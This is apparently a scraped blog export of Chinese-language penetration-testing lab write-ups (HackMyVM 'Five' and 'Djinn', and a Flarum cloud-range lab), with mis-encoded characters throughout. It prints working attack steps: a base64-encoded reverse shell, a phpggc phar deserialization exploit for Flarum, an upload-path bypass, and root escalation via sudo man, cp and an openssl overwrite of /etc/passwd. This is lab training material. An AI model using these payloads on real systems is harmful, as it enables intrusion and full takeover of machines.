2.411 seconds (106.18 hosts/sec). 3 responded 123456789101112131415161718192021222324252627282930313233343536373839â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# rustscan -a 192.168.31.177 -r 1-65535.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| &#123;&#125; &#125;| &#123; &#125; |&#123; &#123;__ &#123;_ _&#125;&#123; &#123;__ / ___&#125; / &#123;&#125; \\ | `| || .-. \\| &#123;_&#125; |.-._&#125; &#125; | | .-._&#125; &#125;\\ &#125;/ /\\ \\| |\\ |`-&#x27; `-&#x27;`-----&#x27;`----&#x27; `-&#x27; `----&#x27; `---&#x27; `-&#x27; `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog :: https://github.com/RustScan/RustScan : --------------------------------------TCP handshake? More like a friendly high-five![~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#x27;-b 65435&#x27;.Open 192.168.31.177:80[~] Starting Script(s)[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 01:31 EDTInitiating ARP Ping Scan at 01:31Scanning 192.168.31.177 [1 port]Completed ARP Ping Scan at 01:31, 0.04s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 01:31Completed Parallel DNS resolution of 1 host. at 01:31, 0.04s elapsedDNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 01:31Scanning 192.168.31.177 [1 port]Discovered open port 80/tcp on 192.168.31.177Completed SYN Stealth Scan at 01:31, 0.02s elapsed (1 total ports)Nmap scan report for 192.168.31.177Host is up, received arp-response (0.00042s latency).Scanned at 2025-05-07 01:31:14 EDT for 0sPORT STATE SERVICE REASON80/tcp open http syn-ack ttl 64MAC Address: 08:00:27:FE:58:C8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 0.20 seconds Raw packets sent: 2 (72B) | Rcvd: 2 (72B) åªå¼€å¯äº†ä¸€ä¸ª80ç«¯å£ 80ç«¯å£é¦–é¡µæ˜¯403ï¼Œæ‰«æä¸€ä¸‹ç›®å½• 12345678910111213141516171819202122â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.177&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php,.html===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.177[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: txt,php[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/uploads (Status: 301) [Size: 185] [--&gt; http://192.168.31.177/uploads/]/admin (Status: 301) [Size: 185] [--&gt; http://192.168.31.177/admin/]/upload.php (Status: 200) [Size: 48]/robots.txt (Status: 200) [Size: 17]/upload.html (Status: 200) [Size: 346] /robots.txtè®©è®¿é—®/adminï¼Œè¿˜æœ‰ä¸€ä¸ªupload.htmlå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ ä¸Šåè®¿é—®uploads/rev.phpï¼Œä¼šæ˜¾ç¤º403ï¼Œä¸ŠbpæŠ“ä¸ªåŒ…çœ‹çœ‹ 123456789------WebKitFormBoundaryRK8GGBtt0YpPaKBfContent-Disposition: form-data; name=&quot;directory&quot;uploads/------WebKitFormBoundaryRK8GGBtt0YpPaKBfContent-Disposition: form-data; name=&quot;submit&quot;Upload File------WebKitFormBoundaryRK8GGBtt0YpPaKBf-- è¯·æ±‚ä½“ä¸­æœ‰ä¸€ä¸ªä¸Šä¼ è·¯å¾„ï¼Œç»™uploadsåˆ äº†çœ‹çœ‹ï¼Œç„¶åè®¿é—®/rev.phpï¼Œå¯ä»¥è®¿é—®äº†ï¼Œç›‘å¬ç«¯å£ï¼Œåå¼¹shellå‡ºæ¥ ææƒmelisa1234567www-data@five:/$ sudo -lMatching Defaults entries for www-data on five: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on five: (melisa) NOPASSWD: /bin/cp 12345678910www-data@five:/tmp$ ss -lntupNetid State Recv-Q Send-Q Local Address:Port Peer Address:Portudp UNCONN 0 0 0.0.0.0:68 0.0.0.0:*tcp LISTEN 0 128 127.0.0.1:4444 0.0.0.0:*tcp LISTEN 0 128 0.0.0.0:80 0.0.0.0:* users:((&quot;nginx&quot;,pid=409,fd=6))tcp LISTEN 0 128 [::]:80 [::]:* users:((&quot;nginx&quot;,pid=409,fd=7)) 12www-data@five:/tmp$ nc 127.0.0.1 4444SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 å¯ä»¥çœ‹åˆ°4444ç«¯å£æ˜¯sshç«¯å£ï¼Œç”¨socatå°†ç«¯å£è½¬å‘å‡ºæ¥ 1socat TCP-LISTEN:4445,fork TCP4:127.0.0.1:4444 &amp; ç„¶åcpä¸€ä¸ªå…¬é’¥è¿›å» 12345www-data@five:/tmp$ lsauthorized_keyssystemd-private-51833796905d4c16b06d8f390a64e61b-systemd-timesyncd.service-LEvzQEuser.txtwww-data@five:/tmp$ sudo -u melisa cp ./authorized_keys /home/melisa/.ssh ææƒROOT123456melisa@five:~$ sudo -lMatching Defaults entries for melisa on five: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser melisa may run the following commands on five: (ALL) SETENV: NOPASSWD: /bin/pwd, /bin/arch, /bin/man, /bin/id, /bin/rm, /bin/clear å¯ä»¥ä»¥rootç”¨æˆ·è¿è¡Œman 12sudo man man!/bin/sh è¿™ä¸ªä¸è¡Œï¼ŒåŸå› æ˜¯å› ä¸ºåˆ†é¡µç”¨çš„æ˜¯pager 12345678910Controlling formatted output -P pager, --pager=pager Specify which output pager to use. By default, man uses pager, falling back to cat if pager is not found or is not executable. This option overrides the $MANPAGER environment variable, which in turn overrides the $PAGER environment variable. It is not used in conjunction with -f or -k. The value may be a simple command name or a command with arguments, and may use shell quoting (backâ€ slashes, single quotes, or double quotes). It may not use pipes to connect multiple commands; if you need that, use a wrapper script, which may take the file to display either as an argument or on stanâ€ dard input. æŒ‡å®šlessä½œä¸ºåˆ†é¡µç”¨çš„å‘½ä»¤å°±è¡Œ 12melisa@five:~$ sudo man -P less id!bash","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Djinn","slug":"HackmyVM-Djinn","date":"2025-05-06T08:48:03.000Z","updated":"2025-05-06T09:39:23.592Z","comments":true,"path":"2025/05/06/HackmyVM-Djinn/","permalink":"https://lvzhouhang.xyz/2025/05/06/HackmyVM-Djinn/","excerpt":"","text":"ä¿¡æ¯æœé›†12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:e7:50:e0 PCS Systemtechnik GmbH192.168.31.176 08:00:27:36:b4:d6 PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 3.098 seconds (82.63 hosts/sec). 3 respondeds 192.168.31.176æ˜¯é¶æœºip 123456789101112131415161718192021222324252627282930313233343536373839404142434445â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# rustscan -a 192.168.31.176 -r 1-65535.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| &#123;&#125; &#125;| &#123; &#125; |&#123; &#123;__ &#123;_ _&#125;&#123; &#123;__ / ___&#125; / &#123;&#125; \\ | `| || .-. \\| &#123;_&#125; |.-._&#125; &#125; | | .-._&#125; &#125;\\ &#125;/ /\\ \\| |\\ |`-&#x27; `-&#x27;`-----&#x27;`----&#x27; `-&#x27; `----&#x27; `---&#x27; `-&#x27; `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog :: https://github.com/RustScan/RustScan : --------------------------------------Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#x27;-b 65435&#x27;.Open 192.168.31.176:21Open 192.168.31.176:1337Open 192.168.31.176:7331[~] Starting Script(s)[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 04:49 EDTInitiating ARP Ping Scan at 04:49Scanning 192.168.31.176 [1 port]Completed ARP Ping Scan at 04:49, 0.07s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 04:49Completed Parallel DNS resolution of 1 host. at 04:49, 0.04s elapsedDNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 04:49Scanning 192.168.31.176 [3 ports]Discovered open port 21/tcp on 192.168.31.176Discovered open port 1337/tcp on 192.168.31.176Discovered open port 7331/tcp on 192.168.31.176Completed SYN Stealth Scan at 04:49, 0.02s elapsed (3 total ports)Nmap scan report for 192.168.31.176Host is up, received arp-response (0.00032s latency).Scanned at 2025-05-06 04:49:46 EDT for 0sPORT STATE SERVICE REASON21/tcp open ftp syn-ack ttl 641337/tcp open waste syn-ack ttl 647331/tcp open swx syn-ack ttl 64MAC Address: 08:00:27:36:B4:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 0.26 seconds Raw packets sent: 4 (160B) | Rcvd: 4 (160B) 21ç«¯å£21ç«¯å£å¯ä»¥åŒ¿åç™»å½•ï¼Œé‡Œé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶ 123456789101112131415â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# ftp anonymous@192.168.31.176Connected to 192.168.31.176.220 (vsFTPd 3.0.3)331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||15556|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 11 Oct 20 2019 creds.txt-rw-r--r-- 1 0 0 128 Oct 21 2019 game.txt-rw-r--r-- 1 0 0 113 Oct 21 2019 message.txt 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# cat creds.txtnitu:81299â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# cat game.txtoh and I forgot to tell you I&#x27;ve setup a game for you on port 1337. See if you can reach to thefinal level and get the prize.â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# cat message.txt@nitish81299 I am going on holidays for few days, please take care of all the work.And don&#x27;t mess up anything. ç»™äº†ä¸€ä¸ªç”¨æˆ·åï¼Œä¸€ä¸ªè´¦å·å¯†ç ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¸¸æˆéƒ¨ç½²åœ¨1337ä¸Š 1337ç«¯å£ncè¿æ¥æ˜¯ä¸ªå£ç®—é¢˜å¡ï¼Œå†™ä¸ªè„šæœ¬ 12345678910111213141516171819202122232425262728import reimport socketdef get_question(s): data = s.recv(1024).decode() print(data) question_re=re.search(r&#x27;(\\d.+)\\)&#x27;,data) if question_re: question=question_re.group(1) return question else: return Nonedef send_answer(s,answer): print(answer) s.sendall(answer.encode()+b&#x27;\\n&#x27;)def main(): s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&#x27;192.168.31.176&#x27;,1337)) for _ in range(1,1002): question=get_question(s) if not question: continue print(question) answer = str(eval(question.replace(&#x27;,&#x27;,&#x27;&#x27;).replace(&quot;&#x27;&quot;,&#x27;&#x27;))) send_answer(s,answer) s.close()if __name__ == &#x27;__main__&#x27;: main() ä¼šç»™ä¸€ä¸ªHere is your gift , I hope you know what to do with it: 1356, 6784, 3409knockä¸€ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# knock 192.168.31.176 1356 6784 3409â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# rustscan -a 192.168.31.176 -r 1-65535.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| &#123;&#125; &#125;| &#123; &#125; |&#123; &#123;__ &#123;_ _&#125;&#123; &#123;__ / ___&#125; / &#123;&#125; \\ | `| || .-. \\| &#123;_&#125; |.-._&#125; &#125; | | .-._&#125; &#125;\\ &#125;/ /\\ \\| |\\ |`-&#x27; `-&#x27;`-----&#x27;`----&#x27; `-&#x27; `----&#x27; `---&#x27; `-&#x27; `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog :: https://github.com/RustScan/RustScan : --------------------------------------I scanned ports so fast, even my computer was surprised.[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#x27;-b 65435&#x27;.Open 192.168.31.176:21Open 192.168.31.176:22Open 192.168.31.176:1337Open 192.168.31.176:7331[~] Starting Script(s)[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 05:13 EDTInitiating ARP Ping Scan at 05:13Scanning 192.168.31.176 [1 port]Completed ARP Ping Scan at 05:13, 0.07s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 05:13Completed Parallel DNS resolution of 1 host. at 05:13, 0.00s elapsedDNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 05:13Scanning 192.168.31.176 [4 ports]Discovered open port 21/tcp on 192.168.31.176Discovered open port 22/tcp on 192.168.31.176Discovered open port 7331/tcp on 192.168.31.176Discovered open port 1337/tcp on 192.168.31.176Completed SYN Stealth Scan at 05:13, 0.02s elapsed (4 total ports)Nmap scan report for 192.168.31.176Host is up, received arp-response (0.00043s latency).Scanned at 2025-05-06 05:13:30 EDT for 0sPORT STATE SERVICE REASON21/tcp open ftp syn-ack ttl 6422/tcp open ssh syn-ack ttl 641337/tcp open waste syn-ack ttl 647331/tcp open swx syn-ack ttl 64MAC Address: 08:00:27:36:B4:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 0.20 seconds Raw packets sent: 5 (204B) | Rcvd: 5 (204B) ç°åœ¨22ç«¯å£å¼€äº†ï¼Œä½†æ˜¯ä¹‹å‰ç»™çš„è´¦å·å¯†ç ä¸å¯¹ 7331ç«¯å£çœ‹çœ‹7331ç«¯å£æ˜¯ä»€ä¹ˆï¼Œæ‰«ä¸€ä¸‹ç›®å½•ï¼Œèƒ½æ‰«åˆ°ä¸€ä¸ª/wish,æ˜¯ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹ï¼Œè¾“å…¥å‘½ä»¤æ‰§è¡Œä¹‹åä¼šè·³è½¬http://192.168.31.176:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0Aå‘½ä»¤ç¡®å®æ˜¯æ‰§è¡Œäº†ï¼Œåå¼¹ä¸ªshell 1echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjEyOS80NDQ0IDA+JjE=|base64 -d |bash ææƒSAMåœ¨/home/nitish/.devä¸‹æœ‰ä¸€ä¸ªå‡­è¯ 12www-data@djinn:/home/nitish/.dev$ cat creds.txtnitish:p4ssw0rdStr3r0n9 1234567nitish@djinn:~$ sudo -lMatching Defaults entries for nitish on djinn: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nitish may run the following commands on djinn: (sam) NOPASSWD: /usr/bin/genie 12nitish@djinn:~$ sudo -u sam /usr/bin/genie -c &#x27;/bin/sh&#x27;Pass your wish to GOD, he might be able to help you. å“ˆå“ˆå“ˆå“ˆ -cä¸è¡Œï¼Œçœ‹çœ‹å…¶ä»–å‚æ•°ï¼Œmanæ‰‹å†Œé‡Œè¿˜æœ‰ä¸€ä¸ª-cmdçš„å‚æ•° 123nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd idmy man!!$ ææƒROOT1234567sam@djinn:~$ sudo -lMatching Defaults entries for sam on djinn: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser sam may run the following commands on djinn: (root) NOPASSWD: /root/lago samçš„å®¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ª.pyc,è¿›è¡Œåç¼–è¯‘ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 2.7from getpass import getuserfrom os import systemfrom random import randintdef naughtyboi(): print &#x27;Working on it!! &#x27;def guessit(): num = randint(1, 101) print &#x27;Choose a number between 1 to 100: &#x27; s = input(&#x27;Enter your number: &#x27;) if s == num: system(&#x27;/bin/sh&#x27;) else: print &#x27;Better Luck next time&#x27;def readfiles(): user = getuser() path = input(&#x27;Enter the full of the file to read: &#x27;) print &#x27;User %s is not allowed to read %s&#x27; % (user, path)def options(): print &#x27;What do you want to do ?&#x27; print &#x27;1 - Be naughty&#x27; print &#x27;2 - Guess the number&#x27; print &#x27;3 - Read some damn files&#x27; print &#x27;4 - Work&#x27; choice = int(input(&#x27;Enter your choice: &#x27;)) return choicedef main(op): if op == 1: naughtyboi() elif op == 2: guessit() elif op == 3: readfiles() elif op == 4: print &#x27;work your ass off!!&#x27; else: print &#x27;Do something better with your life&#x27;if __name__ == &#x27;__main__&#x27;: main(options()) å¯ä»¥ç›´æ¥ä¼ å…¥ä¸€ä¸ªnumï¼Œä»–ä¼šå°†ä½ ä¼ å…¥çš„numè§£ææˆå˜é‡å°±å¯ä»¥é€šè¿‡äº†ï¼Œæˆ–è€…å°±çˆ†ç ´æˆ‘å°±ä¸è¯•äº† 1234567891011sam@djinn:/home/sam$ sudo /root/lagoWhat do you want to do ?1 - Be naughty2 - Guess the number3 - Read some damn files4 - WorkEnter your choice:2Choose a number between 1 to 100:Enter your number: num# iduid=0(root) gid=0(root) groups=0(root)","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜¥ç§‹äº‘é•œ-Flarum","slug":"æ˜¥ç§‹äº‘é•œ-Flarum","date":"2025-05-05T02:52:29.000Z","updated":"2025-05-05T05:06:52.396Z","comments":true,"path":"2025/05/05/æ˜¥ç§‹äº‘é•œ-Flarum/","permalink":"https://lvzhouhang.xyz/2025/05/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Flarum/","excerpt":"","text":"FLAG01fscan å…ˆæ‰«æä¸€ä¸‹ 12345678910111213141516171819202122232425â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ../pentest/fscan/fscan2 -h 39.98.127.236â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ â”‚â”‚ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-05-04 22:56:34] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-05-04 22:56:34] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-05-04 22:56:34] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1[2025-05-04 22:56:34] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-05-04 22:56:34] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-05-04 22:56:34] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.127.236:22[2025-05-04 22:56:34] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.127.236:80[2025-05-04 22:56:34] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.127.236:22 =&gt; [ssh] ç‰ˆæœ¬: 8.9p1 Ubuntu 3ubuntu0.3 äº§å“: OpenSSH ç³»ç»Ÿ: Linux ä¿¡æ¯: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3.][2025-05-04 22:56:41] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.127.236:80 =&gt; [http][2025-05-04 22:56:43] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 2[2025-05-04 22:56:43] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-05-04 22:56:43] [INFO] åŠ è½½çš„æ’ä»¶: ssh, webpoc, webtitle[2025-05-04 22:56:43] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.98.127.236 çŠ¶æ€ç : 200 é•¿åº¦: 5882 æ ‡é¢˜: éœ„å£¤ç¤¾åŒº[2025-05-04 22:56:56] [SUCCESS] æ‰«æå·²å®Œæˆ: 3/3 é¡µé¢ä¸Šç»™äº†ä¸€ä¸ªé‚®ç®± administrator@xiaorang.lab å¾ˆæ˜æ˜¾å°±æ˜¯ç®¡ç†å‘˜çš„é‚®ç®±ï¼Œç„¶åçˆ†ç ´å¯†ç å¾—åˆ° 1chris åå°ç®¡ç†æ˜¾ç¤ºæ¡†æ¶æ˜¯ Flarum 1.6.0 å‚è€ƒæ–‡ç«  é¦–å…ˆä¸‹è½½ä¸€ä¸ª phpggc ç„¶åç”Ÿæˆä¸€ä¸ªåå¼¹ shell çš„è¯­å¥ 12â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp/phpggc]â””â”€# ./phpggc -p tar -b Monolog/RCE6 system &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/VPS/PORT 0 &gt;&amp;1&#x27;&quot; ç„¶ååœ¨åå°å¤–è§‚-&gt; è‡ªå®šä¹‰æ ·å¼é‡Œé¢æ·»åŠ  1@import (inline) &#x27;data:text/css;base64,xxx&#x27;; è®¿é—® URL/assets/forum.css, å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„åå¼¹ shell çš„è¯­å¥å·²ç»è¢«å†™è¿›å»äº† ç„¶ååœ¨è‡ªå®šä¹‰æ ·å¼é‡Œé¢ä¿®æ”¹æˆ 123.test &#123; content: data-uri(&quot;phar://./assets/forum.css&quot;);&#125; ç„¶åä¿å­˜ï¼Œshell å°±è¢«å¼¹å‡ºæ¥äº†ï¼Œç„¶åå¼€å§‹ææƒ 1234567www-data@web01:/$ getcap -r / 2 &gt;/dev/null/snap/core20/1974/usr/bin/ping cap_net_raw = ep/snap/core20/1405/usr/bin/ping cap_net_raw = ep/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service, cap_net_admin = ep/usr/bin/openssl = ep/usr/bin/mtr-packet cap_net_raw = ep/usr/bin/ping cap_net_raw = ep å¯ä»¥çœ‹åˆ° openssl å…·æœ‰ sgid çš„æƒé™ï¼Œå†™æ–‡ä»¶ææƒï¼ 123456789101112131415161718192021222324252627282930313233343536373839404142www-data@web01:/tmp$ cat passwd root: x: 0:0: root:/root:/bin/bashdaemon: x: 1:1: daemon:/usr/sbin:/usr/sbin/nologinbin: x: 2:2: bin:/bin:/usr/sbin/nologinsys: x: 3:3: sys:/dev:/usr/sbin/nologinsync: x: 4:65534: sync:/bin:/bin/syncgames: x: 5:60: games:/usr/games:/usr/sbin/nologinman: x: 6:12: man:/var/cache/man:/usr/sbin/nologinlp: x: 7:7: lp:/var/spool/lpd:/usr/sbin/nologinmail: x: 8:8: mail:/var/mail:/usr/sbin/nologinnews: x: 9:9: news:/var/spool/news:/usr/sbin/nologinuucp: x: 10:10: uucp:/var/spool/uucp:/usr/sbin/nologinproxy: x: 13:13: proxy:/bin:/usr/sbin/nologinwww-data: x: 33:33: www-data:/var/www:/usr/sbin/nologinbackup: x: 34:34: backup:/var/backups:/usr/sbin/nologinlist: x: 38:38: Mailing List Manager:/var/list:/usr/sbin/nologinirc: x: 39:39: ircd:/run/ircd:/usr/sbin/nologingnats: x: 41:41: Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody: x: 65534:65534: nobody:/nonexistent:/usr/sbin/nologin_apt: x: 100:65534::/nonexistent:/usr/sbin/nologinsystemd-network: x: 101:102: systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve: x: 102:103: systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus: x: 103:104::/nonexistent:/usr/sbin/nologinsystemd-timesync: x: 104:105: systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinpollinate: x: 105:1::/var/cache/pollinate:/bin/falsesshd: x: 106:65534::/run/sshd:/usr/sbin/nologinsyslog: x: 107:113::/home/syslog:/usr/sbin/nologinuuidd: x: 108:114::/run/uuidd:/usr/sbin/nologintcpdump: x: 109:115::/nonexistent:/usr/sbin/nologintss: x: 110:116: TPM software stack,,,:/var/lib/tpm:/bin/falselandscape: x: 111:117::/var/lib/landscape:/usr/sbin/nologinusbmux: x: 112:46: usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinlxd: x: 999:100::/var/snap/lxd/common/lxd:/bin/falsentp: x: 113:118::/nonexistent:/usr/sbin/nologin_chrony: x: 114:124: Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologinfwupd-refresh: x: 115:125: fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinmysql: x: 116:127: MySQL Server,,,:/nonexistent:/bin/falsell: $1$ Zg12rJZk$P7IV1RqAT005RKjprDSo41:0:0: root:/root:/bin/bashwww-data@web01:/tmp$ cat passwd |openssl enc -out /etc/passwdwww-data@web01:/tmp$ su - llPassword: root@web01:~# flag åœ¨/root ä¸‹ FLAG03ä¸Šä¼  fscan å†åšä¸€ä¸ªä»£ç†ï¼Œfscan æ‰«ï¼ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192root@web01:~# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 :: 1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e: 32:30: a9 brd ff: ff: ff: ff: ff: ff altname enp0s5 altname ens5 inet 172.22.60.52/16 metric 100 brd 172.22.255.255 scope global dynamic eth0 valid_lft 315359312sec preferred_lft 315359312sec inet6 fe80:: 216:3eff: fe32:30a9/64 scope link valid_lft forever preferred_lft foreverroot@web01:~# ./fscan2 -h 172.22.60.52/24â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ â”‚â”‚ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-05-05 11:28:42] [INFO] 